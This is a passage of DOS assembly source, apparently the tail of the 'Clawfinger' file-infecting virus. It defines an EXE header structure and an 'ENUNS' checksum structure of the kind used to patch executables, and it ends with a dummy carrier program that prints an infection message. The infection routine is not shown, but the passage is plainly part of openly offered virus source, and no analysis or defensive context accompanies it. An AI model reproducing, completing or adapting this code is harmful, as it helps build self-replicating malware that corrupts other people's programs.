EXE_Mark        DW      0       ; Marker valid .EXE-file: MZ or ZM.
Image_Mod_512   DW      0
Image_512_Pages DW      0
Reloc_Items     DW      0
Headersize_Para DW      0
Min_Mem_Para    DW      0
Max_Mem_Para    DW      0
Program_SS      DW      0
Program_SP      DW      0
Checksum        DW      0
Program_IP      DW      0
Program_CS      DW      0
Offs_RelocTable DW      0
Overlay_Number  DW      0
Undocumented    DW      0
Unused          DW      0
EXE_Header      ENDS


ENUNS_Format    STRUC
Stupid_Bullshit DB      5 DUP(0)
ENUNS_Checksum  DW      0
ENUNS_Format    ENDS



; The host of this infected file.
Carrier:
                PUSH    CS
                POP     DS

                MOV     AH, 09h
                MOV     DX, OFFSET Warning_Msg
                INT     21h

                MOV     AX, 4C00h
                INT     21h

Warning_Msg     DB      'Infected with the Clawfinger virus!', 0Ah, 0Dh, '$'

                END     START

